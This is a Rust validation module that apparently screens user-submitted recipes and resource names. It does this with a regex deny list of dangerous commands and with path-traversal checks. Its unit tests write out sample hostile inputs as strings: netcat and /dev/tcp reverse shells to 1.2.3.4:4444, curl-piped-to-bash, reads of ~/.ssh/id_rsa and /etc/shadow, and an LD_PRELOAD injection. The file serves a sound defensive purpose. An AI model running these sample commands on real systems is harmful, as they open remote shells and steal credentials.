//! Content validation utilities

use crate::error::{TeamError, TeamResult};
use regex::Regex;
use std::sync::LazyLock;

/// Dangerous patterns to check in recipes (regex patterns)
static DANGEROUS_PATTERNS_REGEX: LazyLock<Vec<Regex>> = LazyLock::new(|| {
    vec![
        // Shell destructive commands
        Regex::new(r"(?i)rm\s+-rf\s+/").unwrap(),
        Regex::new(r"(?i)rm\s+-rf\s+~").unwrap(),
        Regex::new(r"(?i)rm\s+-rf\s+\*").unwrap(),
        Regex::new(r":\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;").unwrap(), // fork bomb
        Regex::new(r"(?i)mkfs\.").unwrap(),
        Regex::new(r"(?i)dd\s+if=/dev/").unwrap(),
        Regex::new(r">\s*/dev/sd[a-z]").unwrap(),
        Regex::new(r"(?i)chmod\s+-R\s+777\s+/").unwrap(),
        Regex::new(r"(?i)chown\s+-R\s+.*\s+/").unwrap(),
        // SQL injection patterns
        Regex::new(r"(?i)delete\s+from").unwrap(),
        Regex::new(r"(?i)drop\s+table").unwrap(),
        Regex::new(r"(?i)drop\s+database").unwrap(),
        Regex::new(r"(?i)truncate\s+table").unwrap(),
        Regex::new(r"(?i);\s*--").unwrap(), // SQL comment injection
        // Command execution
        Regex::new(r"(?i)exec\s*\(").unwrap(),
        Regex::new(r"(?i)eval\s*\(").unwrap(),
        Regex::new(r"(?i)system\s*\(").unwrap(),
        Regex::new(r"(?i)subprocess\.").unwrap(), // Python subprocess
        Regex::new(r"(?i)os\.system\s*\(").unwrap(), // Python os.system
        Regex::new(r"(?i)os\.popen\s*\(").unwrap(), // Python os.popen
        Regex::new(r"(?i)__import__\s*\(").unwrap(), // Python dynamic import
        Regex::new(r"(?i)compile\s*\(.*exec").unwrap(), // Python compile+exec
        // Remote code execution
        Regex::new(r"(?i)curl\s+.*\|\s*bash").unwrap(),
        Regex::new(r"(?i)curl\s+.*\|\s*sh").unwrap(),
        Regex::new(r"(?i)wget\s+.*\|\s*bash").unwrap(),
        Regex::new(r"(?i)wget\s+.*\|\s*sh").unwrap(),
        Regex::new(r"(?i)curl\s+.*>\s*/tmp/.*&&").unwrap(), // download and execute pattern
        // Network reverse shell patterns
        Regex::new(r"(?i)\bnc\b.*-e\s+/bin/").unwrap(), // netcat reverse shell
        Regex::new(r"(?i)\bnetcat\b.*-e\s+/bin/").unwrap(),
        Regex::new(r"(?i)\bncat\b.*-e\s+/bin/").unwrap(),
        Regex::new(r"(?i)/dev/tcp/").unwrap(), // bash network redirection
        Regex::new(r"(?i)socket\.connect\s*\(").unwrap(), // Python socket connect
        // PowerShell dangerous commands
        Regex::new(r"(?i)invoke-expression").unwrap(),
        Regex::new(r"(?i)invoke-webrequest.*\|\s*iex").unwrap(),
        Regex::new(r"(?i)downloadstring\s*\(").unwrap(),
        Regex::new(r"(?i)set-executionpolicy\s+bypass").unwrap(),
        Regex::new(r"(?i)-encodedcommand").unwrap(),
        // Rust unsafe (for extension configs)
        Regex::new(r"(?i)\bunsafe\s*\{").unwrap(),
        // Environment manipulation
        Regex::new(r"(?i)export\s+PATH\s*=\s*/").unwrap(), // PATH hijacking
        Regex::new(r"(?i)export\s+LD_PRELOAD").unwrap(), // LD_PRELOAD injection
        Regex::new(r"(?i)export\s+LD_LIBRARY_PATH\s*=\s*/").unwrap(),
        // Privilege escalation
        Regex::new(r"(?i)sudo\s+chmod\s+\+s").unwrap(), // setuid
        Regex::new(r"(?i)sudo\s+chown\s+root").unwrap(),
        // Credential theft
        Regex::new(r"(?i)cat\s+.*\.ssh/").unwrap(),
        Regex::new(r"(?i)cat\s+.*/etc/shadow").unwrap(),
        Regex::new(r"(?i)cat\s+.*/etc/passwd").unwrap(),
    ]
});

/// Valid resource name pattern: alphanumeric, underscore, hyphen, dot
static VALID_RESOURCE_NAME: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"^[a-zA-Z0-9_\-\.]+$").unwrap()
});

/// Validate resource name to prevent path traversal attacks
///
/// # Arguments
/// * `name` - The resource name to validate
///
/// # Returns
/// * `Ok(())` if the name is valid
/// * `Err(TeamError::InvalidResourceName)` if the name contains forbidden characters
pub fn validate_resource_name(name: &str) -> TeamResult<()> {
    // Check for empty name
    if name.is_empty() {
        return Err(TeamError::InvalidResourceName {
            name: name.to_string(),
        });
    }

    // Check for path traversal sequences
    if name.contains("..") || name.contains('/') || name.contains('\\') {
        return Err(TeamError::InvalidResourceName {
            name: name.to_string(),
        });
    }

    // Check for null bytes (could be used to truncate paths)
    if name.contains('\0') {
        return Err(TeamError::InvalidResourceName {
            name: name.to_string(),
        });
    }

    // Check against valid pattern (alphanumeric, underscore, hyphen, dot)
    if !VALID_RESOURCE_NAME.is_match(name) {
        return Err(TeamError::InvalidResourceName {
            name: name.to_string(),
        });
    }

    // Check for reserved names on Windows
    let upper_name = name.to_uppercase();
    let reserved_names = [
        "CON", "PRN", "AUX", "NUL",
        "COM1", "COM2", "COM3", "COM4", "COM5", "COM6", "COM7", "COM8", "COM9",
        "LPT1", "LPT2", "LPT3", "LPT4", "LPT5", "LPT6", "LPT7", "LPT8", "LPT9",
    ];

    // Extract base name without extension for reserved name check
    let base_name = upper_name.split('.').next().unwrap_or(&upper_name);
    if reserved_names.contains(&base_name) {
        return Err(TeamError::InvalidResourceName {
            name: name.to_string(),
        });
    }

    // Check maximum length (255 is common filesystem limit)
    if name.len() > 200 {
        return Err(TeamError::InvalidResourceName {
            name: name.to_string(),
        });
    }

    Ok(())
}

/// Validate skill content (Markdown)
pub fn validate_skill_content(content: &str) -> TeamResult<()> {
    if content.trim().is_empty() {
        return Err(TeamError::InvalidContent {
            reason: "Skill content cannot be empty".to_string(),
        });
    }

    // Basic check - skill should have some structure
    if content.len() < 10 {
        return Err(TeamError::InvalidContent {
            reason: "Skill content is too short".to_string(),
        });
    }

    Ok(())
}

/// Validate recipe content (YAML)
pub fn validate_recipe_content(content: &str) -> TeamResult<()> {
    if content.trim().is_empty() {
        return Err(TeamError::InvalidContent {
            reason: "Recipe content cannot be empty".to_string(),
        });
    }

    // Check for dangerous patterns using regex
    for pattern in DANGEROUS_PATTERNS_REGEX.iter() {
        if pattern.is_match(content) {
            return Err(TeamError::InvalidContent {
                reason: format!("Recipe contains potentially dangerous pattern"),
            });
        }
    }

    // Parse as YAML to verify syntax
    let _: serde_yaml::Value = serde_yaml::from_str(content).map_err(|e| {
        TeamError::InvalidContent {
            reason: format!("Invalid YAML syntax: {}", e),
        }
    })?;

    Ok(())
}

/// Validate extension config (JSON)
pub fn validate_extension_config(config_json: &str) -> TeamResult<()> {
    // Try to parse as JSON
    let _: serde_json::Value = serde_json::from_str(config_json).map_err(|e| {
        TeamError::InvalidContent {
            reason: format!("Invalid JSON configuration: {}", e),
        }
    })?;

    Ok(())
}

/// Check if extension needs security review
pub fn needs_security_review(extension_type: &str, config_json: &str) -> bool {
    // Stdio extensions that run arbitrary commands need review
    if extension_type == "stdio" {
        // Check if there's a command specified
        if let Ok(config) = serde_json::from_str::<serde_json::Value>(config_json) {
            if config.get("cmd").is_some() {
                return true;
            }
        }
    }

    false
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_validate_skill_content() {
        assert!(validate_skill_content("# My Skill\n\nThis is a skill.").is_ok());
        assert!(validate_skill_content("").is_err());
        assert!(validate_skill_content("short").is_err());
    }

    #[test]
    fn test_validate_recipe_content() {
        assert!(validate_recipe_content("name: test\nsteps:\n  - step1").is_ok());
        assert!(validate_recipe_content("").is_err());
        // Test dangerous patterns
        assert!(validate_recipe_content("rm -rf / something").is_err());
        assert!(validate_recipe_content("DROP TABLE users").is_err());
        assert!(validate_recipe_content("curl http://example.com | bash").is_err());
        // Test invalid YAML syntax
        assert!(validate_recipe_content("name: test\n  invalid indent").is_err());
        assert!(validate_recipe_content("key: value:\n  nested: broken").is_err());
        // Valid YAML without dangerous patterns
        assert!(validate_recipe_content("simple: value").is_ok());
        assert!(validate_recipe_content("list:\n  - item1\n  - item2").is_ok());
        assert!(validate_recipe_content("nested:\n  key: value\n  other: 123").is_ok());
    }

    #[test]
    fn test_validate_recipe_extended_patterns() {
        // Python patterns
        assert!(validate_recipe_content("run: os.system('cmd')").is_err());
        assert!(validate_recipe_content("import subprocess.call").is_err());
        assert!(validate_recipe_content("__import__('os')").is_err());

        // Network patterns
        assert!(validate_recipe_content("nc -e /bin/sh 1.2.3.4 4444").is_err());
        assert!(validate_recipe_content("cmd: bash -i >& /dev/tcp/1.2.3.4/4444 0>&1").is_err());

        // PowerShell patterns
        assert!(validate_recipe_content("Invoke-Expression $code").is_err());
        assert!(validate_recipe_content("powershell -encodedcommand ABC123").is_err());

        // Environment manipulation
        assert!(validate_recipe_content("export LD_PRELOAD=/tmp/evil.so").is_err());

        // Credential theft
        assert!(validate_recipe_content("cat ~/.ssh/id_rsa").is_err());
        assert!(validate_recipe_content("cat /etc/shadow").is_err());

        // Safe content should pass
        assert!(validate_recipe_content("name: safe-recipe\nsteps:\n  - echo hello").is_ok());
    }

    #[test]
    fn test_validate_extension_config() {
        assert!(validate_extension_config(r#"{"cmd": "node", "args": []}"#).is_ok());
        assert!(validate_extension_config("not json").is_err());
    }

    #[test]
    fn test_validate_resource_name_valid() {
        assert!(validate_resource_name("my-skill").is_ok());
        assert!(validate_resource_name("my_skill").is_ok());
        assert!(validate_resource_name("skill123").is_ok());
        assert!(validate_resource_name("skill.v1").is_ok());
        assert!(validate_resource_name("My-Skill_v1.2").is_ok());
    }

    #[test]
    fn test_validate_resource_name_path_traversal() {
        // Path traversal attempts
        assert!(validate_resource_name("../etc/passwd").is_err());
        assert!(validate_resource_name("..\\windows\\system32").is_err());
        assert!(validate_resource_name("skill/../other").is_err());
        assert!(validate_resource_name("/etc/passwd").is_err());
        assert!(validate_resource_name("C:\\Windows").is_err());
    }

    #[test]
    fn test_validate_resource_name_special_chars() {
        // Special characters
        assert!(validate_resource_name("skill\0name").is_err());
        assert!(validate_resource_name("skill name").is_err()); // space
        assert!(validate_resource_name("skill<name>").is_err());
        assert!(validate_resource_name("skill|name").is_err());
        assert!(validate_resource_name("skill:name").is_err());
    }

    #[test]
    fn test_validate_resource_name_windows_reserved() {
        // Windows reserved names
        assert!(validate_resource_name("CON").is_err());
        assert!(validate_resource_name("con").is_err());
        assert!(validate_resource_name("PRN").is_err());
        assert!(validate_resource_name("COM1").is_err());
        assert!(validate_resource_name("LPT1").is_err());
        assert!(validate_resource_name("NUL").is_err());
        assert!(validate_resource_name("AUX.txt").is_err()); // with extension
    }

    #[test]
    fn test_validate_resource_name_edge_cases() {
        // Edge cases
        assert!(validate_resource_name("").is_err()); // empty
        assert!(validate_resource_name(&"a".repeat(201)).is_err()); // too long
        assert!(validate_resource_name("a").is_ok()); // single char is ok
    }
}
